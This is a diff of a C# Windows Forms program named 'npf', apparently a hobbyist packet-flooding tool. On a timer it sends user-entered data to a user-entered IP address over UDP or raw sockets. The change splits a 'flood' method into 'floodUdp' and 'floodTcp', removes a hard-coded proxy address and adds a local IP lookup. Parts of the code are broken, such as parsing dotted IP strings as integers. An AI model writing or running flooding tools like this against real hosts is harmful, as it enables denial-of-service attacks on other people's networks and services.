@@ -48,8 +48,8 @@ namespace npf
         {
             try
             {
-                using (var client = new WebClient())
-                using (client.OpenRead("http://google.com/generate_204"))
+                using (var CheckClient = new WebClient())
+                using (CheckClient.OpenRead("http://google.com/generate_204"))
                     return true;
             }
             catch
@@ -57,13 +57,40 @@ namespace npf
                 return false;
             }
         }
+        public static string GetLocalIPAddress() //this gets the local ip address for binding the tcp connection
+        {
+            var host = Dns.GetHostEntry(Dns.GetHostName());
+            foreach (var ip in host.AddressList)
+            {
+                if (ip.AddressFamily == AddressFamily.InterNetwork)
+                {
+                    return ip.ToString();
+                }
+            }
+            throw new Exception("Failed to parse local IP address. Check if there are network adapters with an IPv4 address in the system.");
+        }
 
         private void floodTimer_Tick(object sender, EventArgs e)
         {
             bool internetcon = CheckForInternetConnection(); // this checks the internet connection every second, it is not very efficient but i do not care
             if (internetcon)
             {
-                flood();
+                foreach (int s in ProtocolBox.CheckedIndices) // this checks which boxes were checked
+                {
+                    int checkthings = Int16.Parse(s.ToString());
+                    if (checkthings == 0)
+                    {
+                        floodTcp();
+                    }
+                    else if (checkthings == 1)
+                    {
+                        floodUdp();
+                    }
+                    else
+                    {
+                        MessageBox.Show("Please check you checked a box. Checking 0 or both will not work.");
+                    }
+                }
             }
             else
             {
@@ -71,9 +98,8 @@ namespace npf
                 System.Windows.Forms.Application.Exit();
             }
         }
-        private void flood() // all the upcoming code happens every second or so, fucking end me
+        private void floodUdp() // all the upcoming code happens every second or so
         {
-            WebProxy myproxy = new WebProxy("139.99.135.214", 80); // this is the proxy setup, btw the server is located in america so yeah that may or may not be an issue depending on where you live
             UdpClient client = new UdpClient(); // this is just the udp client, nothing interesting
             string ipaddr = IPText.Text;
             try
@@ -83,6 +109,30 @@ namespace npf
                 client.Send(sendBytes, sendBytes.Length); // this actually sends the packet
                 client.AllowNatTraversal(true);
                 client.DontFragment = true;
+            }
+            catch
+            {
+                const string errorMessage = "There was an error with npf.";
+                const string errorCaption = "Ensure that you have an internet connection and that all the data is entered correctly.";
+                MessageBox.Show(errorMessage, errorCaption,
+                    MessageBoxButtons.OK);
+            }
+        }
+        private void floodTcp() // just floodudp but for tcp
+        {
+            TcpClient client = new TcpClient(); // this is just the tcp client, nothing interesting
+            string ipaddr = IPText.Text;
+            long ipaddrtcp = long.Parse(ipaddr);
+            string localhost = GetLocalIPAddress();
+            long localhosttcp = long.Parse(localhost);
+            try
+            {
+                using (Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.IP))
+                {
+                    sock.Bind(new IPEndPoint(localhosttcp, 80)); // this binds to the local ip address
+                    byte[] data = Encoding.ASCII.GetBytes(DataText.Text);
+                    sock.SendTo(data, new IPEndPoint(ipaddrtcp, 80)); // this sends the tcp packet
+                }
             }
             catch
             {
